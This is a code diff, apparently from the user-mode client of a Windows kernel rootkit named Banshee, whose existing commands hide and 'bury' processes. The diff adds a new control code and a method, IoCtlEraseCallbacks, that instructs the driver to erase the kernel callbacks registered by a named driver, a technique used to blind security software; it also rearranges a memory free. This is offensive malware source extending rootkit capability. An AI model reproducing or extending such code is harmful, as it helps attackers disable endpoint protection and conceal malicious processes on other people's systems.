@@ -28,9 +28,9 @@ typedef struct _IOCTL_PROTECT_PROCESS_PAYLOAD {
 
 #define BE_IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-
 #define BE_IOCTL_ENUMERATE_PROCESS_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define BE_IOCTL_ENUMERATE_THREAD_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define BE_IOCTL_ERASE_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 enum CALLBACK_TYPE {
     CreateProcessNotifyRoutine = 0,
@@ -217,14 +217,14 @@ public:
             NULL, 0,
             &dwBytesReturned, NULL
         );
+     
+        delete[] wsProcessToBury;
 
         if (!success)
         {
-            delete[] wsProcessToBury;
             return BE_ERR_IOCTL;
         }
 
-        delete[] wsProcessToBury;
         return BE_SUCCESS;
     }
 
@@ -391,6 +391,38 @@ public:
         }
 
         delete[] outBuf;
+        return BE_SUCCESS;
+    }
+
+    /**
+    * Dispatches IOCTL to erase kernel callbacks of a specific driver.
+    *
+    * @return BANSHEE_STATUS status code.
+    */
+    BANSHEE_STATUS
+    IoCtlEraseCallbacks(const std::string& targetDriver) const
+    {
+        DWORD dwBytesReturned = 0;
+
+        // Convert to wchar*
+        INT wchars_num = MultiByteToWideChar(CP_UTF8, 0, targetDriver.c_str(), -1, NULL, 0);
+        wchar_t* wsTargetDriver = new wchar_t[wchars_num];
+        MultiByteToWideChar(CP_UTF8, 0, targetDriver.c_str(), -1, wsTargetDriver, wchars_num);
+
+        BOOL success = DeviceIoControl(
+            this->hDevice,
+            BE_IOCTL_ERASE_CALLBACKS,
+            (LPVOID)wsTargetDriver, ((DWORD)(wcslen(wsTargetDriver) + 1)) * sizeof(WCHAR),
+            NULL, 0,
+            &dwBytesReturned, NULL
+        );
+
+        delete[] wsTargetDriver;
+
+        if (!success)
+        {
+            return BE_ERR_IOCTL;
+        }
         return BE_SUCCESS;
     }
 
